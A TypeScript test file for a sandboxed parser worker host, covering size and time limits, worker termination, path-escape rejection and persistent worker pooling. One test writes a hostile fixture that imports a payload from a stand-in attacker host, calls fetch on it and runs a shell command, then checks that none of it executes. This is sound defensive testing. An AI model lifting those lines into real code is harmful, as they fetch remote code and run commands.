import { EventEmitter } from 'node:events';
import { mkdtemp, mkdir, realpath, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Worker, type WorkerOptions } from 'node:worker_threads';

import { afterEach, describe, expect, it, vi } from 'vitest';

import { DEFAULT_PARSER_LIMITS, type ParserLimitsV1 } from '../types.js';
import type { AdapterWorkerRequestV1 } from '../worker-protocol.js';
import {
  persistentParserWorkersStarted,
  runAdapterWorker,
  WORKER_DIAGNOSTICS,
} from '../worker-host.js';

const temporaryDirectories: string[] = [];

async function temporaryRoot(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'lux-parser-safety-'));
  temporaryDirectories.push(root);
  return root;
}

function request(
  root: string,
  filePath: string,
  limits: Partial<ParserLimitsV1> = {}
): AdapterWorkerRequestV1 {
  return {
    schemaVersion: 1,
    adapterId: 'tree-sitter',
    input: {
      corpusRoot: root,
      allowedRoots: [root],
      filePath,
      limits: { ...DEFAULT_PARSER_LIMITS, ...limits },
    },
  };
}

function fixture(name: string): URL {
  return new URL(`./fixtures/worker/${name}`, import.meta.url);
}

/**
 * A clock the test advances by hand. The host's limits expire only when a test says so, so no
 * outcome depends on how long a worker takes to start or answer on a loaded machine.
 */
class ManualTimers {
  /** Every delay armed, in order. */
  readonly armed: number[] = [];
  private pending: Array<{ callback: () => void; delayMs: number }> = [];

  set = (callback: () => void, delayMs: number): unknown => {
    const timer = { callback, delayMs };
    this.armed.push(delayMs);
    this.pending.push(timer);
    return timer;
  };

  clear = (handle: unknown): void => {
    this.pending = this.pending.filter((timer) => timer !== handle);
  };

  get pendingDelays(): number[] {
    return this.pending.map((timer) => timer.delayMs);
  }

  /** Wait until exactly one timer is pending and it has the given delay, then expire it. */
  async expire(delayMs: number): Promise<void> {
    await vi.waitFor(() => expect(this.pendingDelays).toEqual([delayMs]), { timeout: 30_000 });
    this.pending.shift()!.callback();
  }
}

/** How long a worker has to report that its parse started (WORKER_START_LIMIT_MS). */
const START_LIMIT_MS = 30_000;

class NeverWorker extends EventEmitter {
  terminate = vi.fn(async () => 0);
}

afterEach(async () => {
  await Promise.all(
    temporaryDirectories.splice(0).map((path) => rm(path, { recursive: true, force: true }))
  );
});

describe('bounded parser worker host', () => {
  it('accepts an input exactly at maxBytes', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'exact.ts');
    const source = 'export const exact = 1;';
    await writeFile(file, source);

    const result = await runAdapterWorker(
      request(root, file, { maxBytes: Buffer.byteLength(source) })
    );

    expect(result.ok).toBe(true);
  });

  it('rejects an input over 2 MiB before worker construction', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'oversized.ts');
    await writeFile(file, Buffer.alloc(DEFAULT_PARSER_LIMITS.maxBytes + 1, 0x20));
    const createWorker = vi.fn((_url: URL, _options: WorkerOptions) => new NeverWorker());

    const result = await runAdapterWorker(request(root, file), { createWorker });

    expect(result).toEqual({
      schemaVersion: 1,
      ok: false,
      diagnostic: { code: 'limit', message: WORKER_DIAGNOSTICS.fileLimit },
    });
    expect(createWorker).not.toHaveBeenCalled();
  });

  it('actually terminates a worker whose parse hangs past the limit', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'input.ts');
    await writeFile(file, 'export const value = 1;');
    const timers = new ManualTimers();
    let exited = false;
    const createWorker = (url: URL, options: WorkerOptions): Worker => {
      const worker = new Worker(url, options);
      worker.once('exit', () => (exited = true));
      return worker;
    };

    const run = runAdapterWorker(request(root, file, { timeoutMs: 40 }), {
      workerUrl: fixture('hang-adapter.mjs'),
      createWorker,
      timers,
    });
    // The fixture reports its parse started and then hangs; only the 40 ms parse limit can end it.
    await timers.expire(40);
    const result = await run;
    await vi.waitFor(() => expect(exited).toBe(true), { timeout: 30_000 });

    expect(result).toEqual({
      schemaVersion: 1,
      ok: false,
      diagnostic: { code: 'timeout', message: WORKER_DIAGNOSTICS.timeout },
    });
  }, 60_000);

  it('calls terminate and waits no longer than the 250 ms grace', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'input.ts');
    await writeFile(file, 'export const value = 1;');
    const worker = new NeverWorker();
    worker.terminate = vi.fn(() => new Promise<number>(() => undefined));
    const timers = new ManualTimers();

    const run = runAdapterWorker(request(root, file, { timeoutMs: 5 }), {
      createWorker: () => {
        queueMicrotask(() => worker.emit('message', { schemaVersion: 1, parseStarted: true }));
        return worker;
      },
      timers,
    });
    await timers.expire(5);
    // terminate() never settles, so the host gives up on it after the grace period and no sooner.
    expect(worker.terminate).toHaveBeenCalledOnce();
    await timers.expire(250);
    const result = await run;

    expect(result.ok).toBe(false);
    expect(!result.ok && result.diagnostic.code).toBe('timeout');
    expect(timers.armed).toEqual([START_LIMIT_MS, 5, 250]);
  });

  it('rejects a response over 8 MiB before attempting JSON decoding', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'input.ts');
    await writeFile(file, 'export const value = 1;');

    const result = await runAdapterWorker(request(root, file), {
      workerUrl: fixture('oversized-result-adapter.mjs'),
    });

    expect(result).toEqual({
      schemaVersion: 1,
      ok: false,
      diagnostic: { code: 'limit', message: WORKER_DIAGNOSTICS.resultLimit },
    });
  });

  it.each([
    ['NUL', 'bad\0.ts'],
    ['control character', 'bad\ntest.ts'],
    ['traversal', '../outside.ts'],
    ['URI', 'file:///tmp/outside.ts'],
  ])('rejects %s paths before worker construction', async (_label, unsafePath) => {
    const root = await temporaryRoot();
    const createWorker = vi.fn((_url: URL, _options: WorkerOptions) => new NeverWorker());

    const result = await runAdapterWorker(request(root, unsafePath), { createWorker });

    expect(result.ok).toBe(false);
    expect(!result.ok && result.diagnostic.code).toBe('path-escape');
    expect(createWorker).not.toHaveBeenCalled();
  });

  it('allows an in-root symlink but rejects a symlink escape before spawn', async () => {
    const parent = await temporaryRoot();
    const root = join(parent, 'root');
    const outside = join(parent, 'outside');
    await mkdir(root);
    await mkdir(outside);
    await writeFile(join(root, 'inside.ts'), 'export const inside = true;');
    await writeFile(join(outside, 'outside.ts'), 'throw new Error("must never execute");');
    await symlink(join(root, 'inside.ts'), join(root, 'inside-link.ts'));
    await symlink(join(outside, 'outside.ts'), join(root, 'outside-link.ts'));

    const insideResult = await runAdapterWorker(request(root, join(root, 'inside-link.ts')));
    const createWorker = vi.fn((_url: URL, _options: WorkerOptions) => new NeverWorker());
    const outsideResult = await runAdapterWorker(request(root, join(root, 'outside-link.ts')), {
      createWorker,
    });

    expect(insideResult.ok).toBe(true);
    expect(outsideResult.ok).toBe(false);
    expect(!outsideResult.ok && outsideResult.diagnostic.code).toBe('path-escape');
    expect(createWorker).not.toHaveBeenCalled();
  });

  it('canonicalizes roots and file path before passing workerData', async () => {
    const parent = await temporaryRoot();
    const root = join(parent, 'root');
    await mkdir(root);
    await mkdir(join(root, 'nested'));
    await writeFile(join(root, 'input.ts'), 'export const value = 1;');
    let received: unknown;
    const worker = new NeverWorker();
    const createWorker = vi.fn((_url: URL, options: WorkerOptions) => {
      received = options.workerData;
      queueMicrotask(() => worker.emit('error', new Error('expected stop')));
      return worker;
    });

    await runAdapterWorker(
      request(join(root, 'nested', '..'), join(root, 'nested', '..', 'input.ts')),
      { createWorker }
    );

    const canonicalRoot = await realpath(root);
    const wire = received as { request: AdapterWorkerRequestV1 };
    expect(wire.request.input.corpusRoot).toBe(canonicalRoot);
    expect(wire.request.input.allowedRoots).toEqual([canonicalRoot]);
    expect(wire.request.input.filePath).toBe(await realpath(join(root, 'input.ts')));
  });

  it('parses source as data without command, network, module, or out-root execution', async () => {
    const parent = await temporaryRoot();
    const root = join(parent, 'root');
    const marker = join(parent, 'executed');
    await mkdir(root);
    const file = join(root, 'hostile.ts');
    await writeFile(
      file,
      [
        "import 'https://attacker.invalid/payload.js';",
        "import '../../outside.js';",
        "import { execFileSync } from 'node:child_process';",
        `execFileSync('touch', [${JSON.stringify(marker)}]);`,
        "fetch('https://attacker.invalid/');",
      ].join('\n')
    );

    const result = await runAdapterWorker(request(root, file));

    expect(result.ok).toBe(true);
    await expect(realpath(marker)).rejects.toThrow();
  });

  it('serves consecutive parses from one persistent worker instead of one worker per file', async () => {
    const root = await temporaryRoot();
    const files: string[] = [];
    for (let index = 0; index < 3; index += 1) {
      const file = join(root, `module-${index}.js`);
      await writeFile(file, `export function f${index}() { return ${index}; }\n`);
      files.push(file);
    }
    const javascript = (file: string): AdapterWorkerRequestV1 => ({
      ...request(root, file),
      adapterId: 'javascript-tree-sitter',
    });
    // The real parser entry, under a URL of its own so no earlier test has warmed this pool.
    const persistentWorkerUrl = new URL(
      '../tree-sitter-worker.ts?pool=consecutive',
      import.meta.url
    );

    const before = persistentParserWorkersStarted();
    const pooled = [];
    for (const file of files) {
      pooled.push(await runAdapterWorker(javascript(file), { persistentWorkerUrl }));
    }
    const started = persistentParserWorkersStarted() - before;

    // A fresh single-use worker per file (the createWorker seam bypasses the pool) parses each file
    // to the same result.
    const fresh = [];
    for (const file of files) {
      fresh.push(
        await runAdapterWorker(javascript(file), {
          createWorker: (url, options) => new Worker(url, options),
        })
      );
    }

    expect(started).toBe(1);
    expect(pooled.every((result) => result.ok)).toBe(true);
    expect(pooled).toEqual(fresh);
  });

  it('gives a parse the same time limit in a warm persistent worker as in a fresh one', async () => {
    const root = await temporaryRoot();
    const quick = join(root, 'quick.js');
    const hung = join(root, 'hung.js');
    await writeFile(quick, 'ok');
    await writeFile(hung, 'hang');
    const limited = (file: string): AdapterWorkerRequestV1 =>
      request(root, file, { timeoutMs: 300 });
    const workerUrl = fixture('timed-parse-adapter.mjs');
    const persistentWorkerUrl = new URL(`${workerUrl.href}?pool=timed`);

    // Warm the pool, then parse in the warm worker and in a fresh one. In both, the start limit is
    // replaced by the parse limit when the worker reports the parse started, so the parse has the
    // same budget however long the worker took to start.
    await runAdapterWorker(limited(quick), { persistentWorkerUrl, timers: new ManualTimers() });
    const warmTimers = new ManualTimers();
    const warmQuick = await runAdapterWorker(limited(quick), {
      persistentWorkerUrl,
      timers: warmTimers,
    });
    const freshTimers = new ManualTimers();
    const freshQuick = await runAdapterWorker(limited(quick), { workerUrl, timers: freshTimers });

    expect(warmQuick.ok).toBe(true);
    expect(freshQuick).toEqual(warmQuick);
    expect(warmTimers.armed).toEqual([START_LIMIT_MS, 300]);
    expect(freshTimers.armed).toEqual([START_LIMIT_MS, 300]);

    // A parse that overruns the limit times out the same way in both. In the persistent worker
    // that is final: the request is not run again in a fresh worker, which would arm more timers.
    const startedBefore = persistentParserWorkersStarted();
    const warmOverTimers = new ManualTimers();
    const warmOverRun = runAdapterWorker(limited(hung), {
      persistentWorkerUrl,
      timers: warmOverTimers,
    });
    await warmOverTimers.expire(300);
    const warmOver = await warmOverRun;
    const freshOverTimers = new ManualTimers();
    const freshOverRun = runAdapterWorker(limited(hung), { workerUrl, timers: freshOverTimers });
    await freshOverTimers.expire(300);
    await freshOverTimers.expire(250); // the fresh worker's termination grace, if it is still going
    const freshOver = await freshOverRun;

    expect(!warmOver.ok && warmOver.diagnostic.code).toBe('timeout');
    expect(freshOver).toEqual(warmOver);
    expect(warmOverTimers.armed).toEqual([START_LIMIT_MS, 300]);
    expect(persistentParserWorkersStarted()).toBe(startedBefore);
  }, 60_000);

  it('discards a persistent worker that hangs and re-runs the parse in a fresh worker', async () => {
    const root = await temporaryRoot();
    const file = join(root, 'input.js');
    await writeFile(file, 'export const value = 1;');
    const javascript: AdapterWorkerRequestV1 = {
      ...request(root, file),
      adapterId: 'javascript-tree-sitter',
    };
    const persistentWorkerUrl = fixture('hang-persistent-adapter.mjs');
    // The persistent worker never reports a parse started, so its start limit is what ends it; the
    // fresh worker that takes over answers on its own, and no other limit expires.
    const timers = new ManualTimers();
    const expireStartLimit = (): Promise<void> => timers.expire(START_LIMIT_MS);

    const before = persistentParserWorkersStarted();
    const firstRun = runAdapterWorker(javascript, { persistentWorkerUrl, timers });
    await expireStartLimit();
    const first = await firstRun;
    const secondRun = runAdapterWorker(javascript, { persistentWorkerUrl, timers });
    await expireStartLimit();
    const second = await secondRun;

    // Each hung persistent worker is terminated, not returned to the pool, so the second request
    // starts another; both requests still parse, in the fresh worker.
    expect(first.ok).toBe(true);
    expect(second).toEqual(first);
    expect(persistentParserWorkersStarted() - before).toBe(2);
  }, 60_000);
});
